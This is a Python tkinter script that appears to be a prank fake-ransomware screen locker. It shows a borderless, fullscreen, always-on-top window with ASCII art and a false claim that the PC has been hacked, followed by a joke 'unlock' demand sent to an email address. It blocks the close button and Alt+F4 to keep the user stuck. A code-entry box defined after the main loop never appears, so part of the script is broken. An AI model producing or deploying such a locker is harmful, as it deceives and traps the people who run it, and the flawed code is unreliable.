import tkinter as tk

ASCII = r"""
                                                                                . . .  .            
             .                                               .       . .      .                     
                                             .                                                      
                                          .             .          .                   .            
   .                                             .                  .                               
        .  .  .                 .   . .                               .                             
                            . .  .......... ............. ..........     .                          
   .         .            .      ... .......-+*%@@@@@%#*=:.... .. ..   . .                     .    
  .      .           .           ....-*%@@@@@@@@@@@@@@@@@@@@@%#=:...      . .                       
                      ...........:*@@@@@%#+:.           ..=*%@@@@@%=... .......                     
.  .      ..     .    ........-%@@@@#-.......           .......:+@@@@%+... .. .                     
                      .....:+@@@%+:..........           ........ ..=#@@@#:.....                     
                 ..    . .*@@@#...                      .      .    ..+@@@%:. ......          .     
                 ... ...+@@@+......               .                .....=@@@#:.......               
.   .            .... -@@@#.......  ..                    . .      .... ..=@@@+......               
                 ....*@@@:.....  .                     .           .........#@@#:....      .    .   
               . ...#@@#.....              .                    .    .   ....=@@@:..            .   
                 ..%@@+.......                      .                    .....:@@@-..           .   
    .      .......#@@=.. . ..     ... .... .  .          . ... .....     .... .-%@@......           
       .  . .....+@@+ ..         ...=%@@%=...           ...:#@@@+...         . .-@@@:.....    . .   
 ..   .    .....-@@%..  . .   .  ..%@@@@@@%.. .         ..+@@@@@@@: .  .       . =@@*.. ..          
         . .....%@@:...          .+@@@@@@@@*..          .:@@@@@@@@@.           ...#@@:....      .   
   . .     .. .=@@*...           .#@@@@@@@@%.           .*@@@@@@@@@-           ...=@@#....          
            ...*@@:. ..          .#@@@@@@@@%.            *@@@@@@@@@-     .     ....@@@:...     .   .
           ....%@%......       . .+@@@@@@@@*.           .:@@@@@@@@%.           ....*@@=...          
            ...@@#.....          ..#@@@@@@#..            .+@@@@@@%:.  . .      ....=@@+... .        
           . .:@@#...            ...-#@@#-..            ...:*@@%+...           . ..-@@*...  .       
           ...:@@#.....          ....... .....   ..    .........  .            ....-@@*...    .     
            ...@@#...                  . .... ......... ......           .     ....=@@+...          
           ....%@%:....                . .....................   .             ....#@@-...          
 .         ....*@@- ..             .   ....=#@@@@@@@@@@@%+:...           .     ....@@@:...          
           ....=@@*...           ......+%@@@@@%#**++*#%@@@@@@*-.....        .  . .=@@*....          
           . ...%@@-...     .    ...-@@@@@+.....   .......=%@@@@*...           ...%@@:....          
 . .       .....:@@%:.           .+@@@%-.....................:*@@@#.      .    ..*@@+.....   .      
     .           =@@*..... ... .-@@@#:.. .                .   ..+@@@+...........+@@%.       . .     
     .   .  .    .#@@*.....  ..+@@%:...                       ....#@@%:........=@@%..               
                 ..*@@*........#@*.....      . .              .....=@%-.......=@@%:..               
                 ...*@@@..........              .   .              ..........*@@#....               
           .  .  ....-@@@=........   .                             ........-%@@*....                
                 .....:#@@@-...           .       ..                   ...*@@%-...... .             
                      ..-@@@@:....... ..         .            .... .... *@@@+..            .        
      .  .           .....=%@@%=........         .         .  . .....-#@@@*....                     
         .            ......-%@@@@-.....                      ....-*@@@@+.......              .   . 
.               ..          ...=@@@@@#-.......................:*%@@@@*:...                      .   
  .   .                     ......=#@@@@@@#=--:.......::-=*%@@@@@%+:......                  .       
                             .........:*@@@@@@@@@@@@@@@@@@@@@*-...........                .         
                         ..           .... .:--===+===--:.....           .   .  . .  .              
                  .   .                .  ...   ....... ......                            .         
                               .     .   .................... .            .                    .   
                              .                                                   .         .       
               .        .                            .                                ..            
                                                     .        .                   .                 
                               .                                  .  .             .                
"""

root = tk.Tk()
root.attributes("-fullscreen", True)
root.attributes("-topmost", True)
root.overrideredirect(True)
root.configure(bg="black")

# ASCII art
ascii_label = tk.Label(
    root,
    text=ASCII,
    font=("Consolas", 6),
    fg="white",
    bg="black",
    justify="center"
)
ascii_label.place(relx=0.5, rely=0.45, anchor="center")

# Text underneath
text_label = tk.Label(
    root,
    text="your pc has been hacked! to unlock your pc send pet photos to lowtiergod555@gmail.com",
    font=("Arial", 24, "bold"),
    fg="white",
    bg="black"
)
text_label.place(relx=0.5, rely=0.75, anchor="center")

#start of blocker stuff frfr
def on_close_attempt():
    # Does nothing, effectively blocking the close
    pass

def on_alt_f4(event):
    on_close_attempt()
    return "break"  #: Stops Alt+F4 from closing the window

# Attach the blockers to the root window
root.bind('<Alt-F4>', on_alt_f4)
root.protocol("WM_DELETE_WINDOW", on_close_attempt)
#

root.mainloop()   
# 1. Define the validation function (allows only digits)
def validate_digit(char):
    return char.isdigit() or char == ""

# 2. Create the white text box
# Replace 'root' with your actual window variable (e.g., self, window, app)
reg = root.register(validate_digit)

code_entry = tk.Entry(
    root,
    bg="white",             # Makes the box white
    fg="black",             # Text color
    width=10,               # Width of the box
    validate="key",         # Validate on every keystroke
    validatecommand=(reg, '%S') # Only allow digits
)
code_entry.pack(pady=10)    # Or use .grid() / .place() depending on your layout

# 3. Enforce exactly 5 characters limit
def limit_length(*args):
    val = code_entry.get()
    if len(val) > 5:
        code_entry.delete(5, tk.END)

# Attach the limit logic
code_entry_var = tk.StringVar()
code_entry_var.trace_add("write", limit_length)
code_entry.config(textvariable=code_entry_var)   
